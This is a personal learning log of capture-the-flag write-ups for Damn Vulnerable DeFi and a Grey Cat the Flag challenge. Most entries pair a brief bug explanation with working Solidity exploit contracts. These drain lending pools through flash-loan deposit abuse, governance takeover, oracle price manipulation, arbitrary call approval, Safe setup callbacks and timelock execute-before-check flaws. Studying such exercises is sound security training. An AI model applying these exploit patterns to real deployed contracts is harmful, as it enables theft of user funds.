---
timezone: America/New_York
---


# spark

1. 自我介绍：web3安全攻城狮
2. 你认为你会完成本次残酷学习吗？会

## Notes

<!-- Content_START -->

### 2024.08.29
- Damn Vulnerable DeFi: Unstoppable
- Grey Cat the Flag 2024 Milotruck challs: GreyHats Dollar

#### Unstoppable
Issue:

The main issue lies inside the `flashLoan`:
- For `totalAssets` it will calculate the total token in the contract:
    ```solidity
            return asset.balanceOf(address(this));
    ```
- For `convertToShares` it will do following calculation, which will calculate the total amount for share token
    ```solidity
        supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
    ```

If `convertToShares(totalSupply) != totalAssets()` revert then the problem will be solved. But how?

Simply, deposit some token directly, so the condition will be broken since supply only update while mint/burn.

Solve:
```solidity
    function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 10);
    }
```



#### GreyHats Dollar
Issue:

The issue algin with the challenge is that, the share update in `transferFrom` function always using legacy share amount when `from` and `to` address are same.
```solidity
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public update returns (bool) {
        // ...

        uint256 _shares = _GHDToShares(amount, conversionRate, false);
        uint256 fromShares = shares[from] - _shares;
        uint256 toShares = shares[to] + _shares;
        
        // ...

        shares[from] = fromShares;
        shares[to] = toShares;

        emit Transfer(from, to, amount);

        return true;
    }
```

Solve:
```solidity
    function solve() external {
        // Claim 1000 GREY
        setup.claim();

        // Mint 1000 GHD using 1000 GREY
        setup.grey().approve(address(setup.ghd()), 1000e18);
        setup.ghd().mint(1000e18);

        setup.ghd().balanceOf(address(this));

        uint256 balance = setup.ghd().balanceOf(address(this));

        setup.ghd().transfer(address(this), balance); //@note gonna double the balance

        
        for (uint i = 0; i <52; i++) {
            setup.ghd().transfer(address(this), balance);
        }

        setup.ghd().transfer(msg.sender, setup.ghd().balanceOf(address(this)));

    }
```

### 2024.08.30

- Damn Vulnerable DeFi: Truster
- Damn Vulnerable DeFi: SideEntrance

#### Truster
Issue:

The issue for this flashloan contract is the usage of `functionCall` which allows the attacker perform function call under flashloan contract's context.

Solve:
```solidity
    function test_truster() public checkSolvedByPlayer {
        test t = new test();

        bytes memory approveData = abi.encodeWithSignature(
            "approve(address,uint256)",
            player,
            type(uint256).max
        );
        
        pool.flashLoan(0, player, address(pool.token()), approveData);

        pool.token().transferFrom(address(pool), recovery, TOKENS_IN_POOL);

    }
```

#### SideEntrance
Issue: 

The main idea for this program is utilize the the deposit function while flashloan which will manipulate the balance and also fulfill the balance requirement to complete the flashloan.

Solve:

```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    Exploit exp = new Exploit(address(pool), recovery);
    exp.attack(address(pool).balance);
}

contract Exploit{
    SideEntranceLenderPool pool;

    address recovery;
    constructor(address _pool, address _recovery) {
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
    }
    function execute()public payable{
        pool.deposit{value:address(this).balance}();
    }
    function attack(uint256 amount) public payable{
        pool.flashLoan(amount);
        pool.withdraw();
        payable(recovery).transfer(address(this).balance);
    }
    receive () external payable {}

}
```

### 2024.08.31

- Damn Vulnerable DeFi: Selfie

#### Selfie
Issue:

I feel the biggest issue is that the pool is providing the governance token via flashloan, as long as the token exceed half of the supply, the proposal can be passed.

```solidity
    function _hasEnoughVotes(address who) private view returns (bool) {
        uint256 balance = _votingToken.getVotes(who);
        uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
        return balance > halfTotalSupply;
    }
```

Solve:
```solidity
    function test_selfie() public checkSolvedByPlayer {
        SelfiePoolExploit spe = new SelfiePoolExploit(
            pool,
            governance,
            token,
            recovery
        );

        spe.attack();

        vm.warp(block.timestamp + 2 days);
        spe.executeAction();

    }

```

```solidity
contract SelfiePoolExploit {
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableVotes votes;
    uint256 public actionId;
    address owner;
    address recovery;

    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableVotes _vote, address _recovery) {
        pool = _pool;
        governance = _governance;
        votes = _vote;
        owner = msg.sender;
        recovery = _recovery;
    }

    function attack() external {
        // init flashloan
        uint256 amount = pool.token().balanceOf(address(pool));
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(pool.token()), amount, data);
    }

    function onFlashLoan(
        address _initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){

        votes.delegate(address(this));

        uint _actionId = governance.queueAction(
            address(pool),
            0,
            data
        );
        actionId = _actionId;

        IERC20(token).approve(address(pool), amount + fee);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeAction() external {
        // Execute the malicious auction
        governance.executeAction(actionId);
    }
}
```


### 2024.09.01

- Damn Vulnerable DeFi: Backdoor

#### Backdoor

Solve:

```solidity
    function test_backdoor() public checkSolvedByPlayer {
        BackdoorAttacker ba = new BackdoorAttacker(recovery, token);
        ba.attack(
            address(walletFactory),
            address(singletonCopy), 
            address(walletRegistry), 
            users
        );

    }
```

```solidity
interface ISafe {
    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external;
}
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

contract Approve {
  function approve(DamnValuableToken token, address spender) external {
      token.approve(spender, type(uint256).max);
    }
}

contract BackdoorAttacker {
  address recovery;
  DamnValuableToken token;
  Approve mApprove;

  constructor(address _recovery, DamnValuableToken _token) {
    recovery = _recovery;
    token = _token;
  }

  function attack(address _walletFactory, address _singletonCopy, address _walletRegistry, address[] calldata _users) external {
    mApprove = new Approve();
    for (uint256 i = 0; i < 4; i++) {
            address[] memory users = new address[](1);
            users[0] = _users[i];
            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector,
                users,
                1,
                mApprove,
                abi.encodeWithSelector(Approve.approve.selector, token, address(this)),
                address(0x0),
                address(0x0),
                0,
                address(0x0)
            );

            SafeProxy proxy = SafeProxyFactory(_walletFactory).createProxyWithCallback(
                _singletonCopy,
                initializer,
                i,
                IProxyCreationCallback(_walletRegistry)
            );

            token.transferFrom(address(proxy), recovery, token.balanceOf(address(proxy)));
        }
    }  
}
```

### 2024.09.03

- Damn Vulnerable DeFi: Puppet
- Damn Vulnerable DeFi: PuppetV2

#### Puppet

Issue: The main issue is using the price from pair which can be manipulated.

Solve:
```
contract PuppetExploit {

    PuppetPool lendingPool;
    address recovery;
    DamnValuableToken token;
    IUniswapV1Exchange uniswapV1Exchange; 
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;

    constructor(PuppetPool _lendingPool, address _recovery, DamnValuableToken _token, IUniswapV1Exchange _uniswapV1Exchange) {
        lendingPool = _lendingPool;
        recovery = _recovery;
        token = _token;
        uniswapV1Exchange = _uniswapV1Exchange;
    }

    function attack() public {
        
        uint256 total = token.balanceOf(address(lendingPool));
        lendingPool.calculateDepositRequired(total);

        token.approve(address(uniswapV1Exchange), type(uint256).max);

        uniswapV1Exchange.tokenToEthSwapInput(
            PLAYER_INITIAL_TOKEN_BALANCE,
            1,
            block.timestamp + 1
        );

        uint256 need = lendingPool.calculateDepositRequired(total);

        assert(need < address(this).balance);

        lendingPool.borrow{value: need}(
            POOL_INITIAL_TOKEN_BALANCE,
            recovery
        );
        
    }

    receive() external payable {}

    
}
```

#### PuppetV2

Issue: Similar to the previous one

Solve:
```solidity
contract PuppetV2Exploit {

    PuppetV2Pool lendingPool;
    address recovery;
    DamnValuableToken token;
    IUniswapV2Pair uniswapV2Exchange; 
    WETH weth;
    IUniswapV2Router02 uniswapV2Router;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    constructor(PuppetV2Pool _lendingPool, address _recovery, DamnValuableToken _token, IUniswapV2Pair _uniswapV2Exchange, WETH _weth, IUniswapV2Router02 _uniswapV2Router) {
        lendingPool = _lendingPool;
        recovery = _recovery;
        token = _token;
        uniswapV2Exchange = _uniswapV2Exchange;
        weth = _weth;
        uniswapV2Router = _uniswapV2Router;
    }

    function attack() public {
                
        token.approve(address(uniswapV2Router), type(uint256).max);
        weth.deposit{value: address(this).balance}();

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
//3e23
        uint256[] memory out = uniswapV2Router.swapExactTokensForTokens(
            PLAYER_INITIAL_TOKEN_BALANCE,
            1, 
            path, 
            address(this), 
            block.timestamp + 100
        );


        uint256 need = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        weth.approve(address(lendingPool), type(uint256).max);


        assert(need < weth.balanceOf(address(this)));

        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);

        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
        
    }

    receive() external payable {}

    
}
```
### 2024.09.04

- Damn Vulnerable DeFi: PuppetV3

#### PuppetV3
```solidity
    function test_puppetV3() public checkSolvedByPlayer {
        ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
        token.approve(address(router), type(uint256).max);
        router.exactInputSingle(
            ISwapRouter.ExactInputSingleParams(
                address(token),
                address(weth),
                FEE,
                address(player),
                block.timestamp + 1,
                PLAYER_INITIAL_TOKEN_BALANCE, 
                0,
                0
            )
        );

        while(true){
            vm.warp(block.timestamp + 10);
            uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
            if(quote <= weth.balanceOf(player)) break;
        }

        console.log("Time: ", block.timestamp);
        weth.approve(address(lendingPool), type(uint256).max);
        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);   

    }
```

### 2024.09.05

- Damn Vulnerable DeFi: Climber

#### Climber

Issue:

The main issue should related to the CHECK-EFFECT-PATTERN broken, which allows anyone run function call first then check the operation validity:
```solidity
        bytes32 id = getOperationId(targets, values, dataElements, salt);

        for (uint8 i = 0; i < targets.length; ++i) {
            targets[i].functionCallWithValue(dataElements[i], values[i]);
        }

        if (getOperationState(id) != OperationState.ReadyForExecution) {
            revert NotReadyForExecution(id);
        }
```

Solve: 

```solidity
contract ClimberExploit{

    address payable timeLock;
    address token;
    address vault;
    address player;
    address recovery;

    address[] targets;
    uint256[] values;
    bytes[] dataElements;

    function exploit(address payable _timeLock, address _token, address _vault, address _player, address _recovery) public {

        MyImplementation mi = new MyImplementation();

        timeLock = _timeLock;
        token = _token;
        vault = _vault;
        player = _player;
        recovery = _recovery;

        targets = new address[](4);
        values = new uint256[](4);
        dataElements = new bytes[](4);

        targets[0] = timeLock;
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        targets[1] = timeLock;
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));

        targets[2] = vault;
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(mi), "");

        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("schedule()");

        ClimberTimelock(timeLock).execute(targets, values, dataElements, bytes32(0));

        MyImplementation(address(vault)).drain(address(token), recovery);

    }


    function schedule() public{
        ClimberTimelock(timeLock).schedule(targets, values, dataElements, bytes32(0));
    }
}

contract MyImplementation is ClimberVault{

    function drain(address token, address receipent) public{
        DamnValuableToken(token).transfer(receipent, DamnValuableToken(token).balanceOf(address(this)));
    }

}
```

<!-- Content_END -->
